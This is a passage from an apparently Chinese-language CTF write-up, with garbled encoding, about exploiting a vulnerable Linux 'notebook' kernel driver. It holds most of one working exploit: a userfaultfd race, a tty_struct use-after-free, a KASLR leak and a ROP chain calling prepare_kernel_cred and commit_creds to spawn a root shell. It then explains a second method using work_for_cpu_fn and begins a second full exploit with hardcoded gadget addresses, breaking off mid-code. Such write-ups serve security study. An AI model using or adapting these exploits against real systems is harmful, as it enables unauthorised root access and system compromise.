class="line"></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">0x200</span>];</span><br><span class="line">    Notebook notebook[<span class="number">0x10</span>];</span><br><span class="line">    page_size=sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    userfaultfd_buf=mmap(<span class="literal">NULL</span>,page_size,PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(page_size);</span><br><span class="line">    <span class="built_in">memset</span>(page,<span class="number">1</span>,page_size);</span><br><span class="line">    registerUserFaultFd(userfaultfd_buf,page_size,fault_handler_thread);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        edit(note_fd,i,<span class="number">0x2e0</span>,name);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,edit_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        tty_fd[i]=open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span>(!tty_fd[i])&#123;</span><br><span class="line">            errExit(<span class="string">&quot;ptmx open fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        pthread_create(&amp;tid,<span class="literal">NULL</span>,add_userfaultfd,i);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fake_tty_ops_idx=<span class="number">-1</span>,rop_idx=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic!=<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">                fake_tty_ops_idx=i;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] fake_tty_ops_idx %d\n&quot;</span>,fake_tty_ops_idx=i);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] rop_idx %d\n&quot;</span>,rop_idx=i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fake_tty_ops_idx==<span class="number">-1</span>||rop_idx==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;fake_tty_ops_idx or rop_idx find fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> uaf_tty=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        read(note_fd,tty_struct,i);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> magic=*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tty_struct;</span><br><span class="line">        <span class="keyword">if</span>(magic==<span class="number">0x5401</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] uaf_idx %d\n&quot;</span>,uaf_tty=i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(uaf_tty==<span class="number">-1</span>)&#123;</span><br><span class="line">        errExit(<span class="string">&quot;not uaf_tty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> tty_ops=tty_struct[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span>((tty_ops&amp;<span class="number">0xfff</span>)==<span class="number">0x440</span>)&#123;</span><br><span class="line">        kernel_base=tty_ops-ptm_unix98_ops_offset;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        kernel_base=tty_ops-pty_unix98_ops_offset;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel_addr %p\033[0m\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    edit(note_fd,fake_tty_ops_idx,<span class="number">0x200</span>,name);</span><br><span class="line">    edit(note_fd,rop_idx,<span class="number">0x200</span>,name);</span><br><span class="line">    gift(note_fd,notebook);</span><br><span class="line">    <span class="keyword">size_t</span> init_cred_addr=init_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds_addr=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode_addr=swapgs_restore_regs_and_return_to_usermode-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi_ret_addr=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdx_pop_rbp_ret_addr=pop_rdx_pop_rbp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_ops_addr=notebook[fake_tty_ops_idx].buf;</span><br><span class="line">    <span class="keyword">size_t</span> rop_addr=notebook[rop_idx].buf;</span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty_struct,tty_struct,<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>]=fake_tty_ops_addr;</span><br><span class="line">    fake_tty_struct[<span class="number">1</span>]=pop_rsp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    fake_tty_struct[<span class="number">2</span>]=rop_addr;</span><br><span class="line"></span><br><span class="line">    ((struct tty_operations *)fake_tty_ops)-&gt;write=push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=MOV_RDI_RAX_POP_RBP_RET-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=swapgs_restore_regs_and_return_to_usermode_addr+<span class="number">22</span>;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)&amp;usr_shell;</span><br><span class="line">    rop[i++]=user_cs;</span><br><span class="line">    rop[i++]=user_rflags;</span><br><span class="line">    rop[i++]=user_sp;</span><br><span class="line">    rop[i++]=user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(note_fd,fake_tty_ops,fake_tty_ops_idx);</span><br><span class="line">    write(note_fd,rop,rop_idx);</span><br><span class="line">    write(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getshell :%p\n&quot;</span>,usr_shell);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        write(tty_fd[i],name,<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è§£æ³•äºŒï¼šuserfaultfd-uaf-tty-struct-work-for-cpu-fn"><a href="#è§£æ³•äºŒï¼šuserfaultfd-uaf-tty-struct-work-for-cpu-fn" class="headerlink" title="è§£æ³•äºŒï¼šuserfaultfd+uaf+tty_struct+work_for_cpu_fn"></a><strong>è§£æ³•äºŒ</strong>ï¼šuserfaultfd+uaf+tty_struct+work_for_cpu_fn</h4><p>åœ¨å¼€å¯äº†å¤šæ ¸æ”¯æŒçš„å†…æ ¸ä¸­éƒ½ä¼šæœ‰è¿™ä¸ª<code>work_for_cpu_fn</code>,å®ƒå°±ç›¸å½“äºä¸€ä¸ªgadget,æ‰§è¡Œrdi+0x20,å‚æ•°æ˜¯rdi+0x28,æŠŠè¿”å›å€¼ä¿å­˜åœ¨rdi+0x30çš„åœ°æ–¹,å‡å¦‚æˆ‘æ§åˆ¶<code>tty_struct</code>çš„<code>tty_operations</code>çš„çš„<code>ioctl</code>å‡½æ•°æŒ‡é’ˆä¸º<code>work_for_cpu_fn</code>ï¼Œåœ¨è°ƒç”¨<code>ioctl(tty_fd,0x200,0x200)</code>å°±ä¼šè°ƒç”¨<code>tty_operations</code>çš„<code>ioctl</code>ä¹Ÿå°±æ˜¯<code>work_for_cpu_fn</code>å‡½æ•°ï¼Œæ­¤æ—¶rdiå°±æ˜¯tty_struct,è€Œæ­¤æ—¶tty_structèƒ½åŠ«æŒçš„è¯å°±èƒ½ä»»æ„å‡½æ•°æ‰§è¡Œäº†ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ<code>prepare_kernel_cred(0)</code>ç„¶åæŠŠè¿”å›å€¼å­˜å‚¨åœ¨<code>tty_struct+0x30</code>çš„åœ°æ–¹ï¼Œæ‰§è¡Œå®Œ<code>work_for_cpu_fn</code>ä¹‹åå†…æ ¸è‡ªåŠ¨è¿”å›ç”¨æˆ·æ€ï¼Œå°±ä¸ç”¨æˆ‘ä»¬è‡ªå·±æ„é€ äº†ï¼Œç„¶åå†æ‰§è¡Œä¸€æ¬¡<code>commit_creds(tty_struct+0x30)</code>å°±å¯ä»¥å¾—åˆ°rootæƒé™äº†ï¼Œæœ€åè¿”å›ç”¨æˆ·æ€æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(<span class="keyword">void</span> *);</span><br><span class="line">    <span class="keyword">void</span> *arg;</span><br><span class="line">    <span class="keyword">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_for_cpu_fn</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, struct work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_struct_size 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ptm_unix98_ops_offset 0xe8e440</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pty_unix98_ops_offset 0xe8e320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret 0xffffffff81238d50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdx_add_byte_r11_0x41_r11b_pop_rsp_pop_rbp_ret 0xffffffff8170dd41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810a9b40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_cred 0xffffffff8225c940</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff81007115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_pop_rbp_ret   0xffffffff8103658c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret   0xffffffff8143f4e1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rsp_ret 0xffffffff810bc110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret 0xffffffff81000091</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810a9ef0 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_rax_call_rdx  0xffffffff8270747f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_ret 0xffffffff81358842</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> work_for_cpu_fn 0xffffffff8109eb90</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span 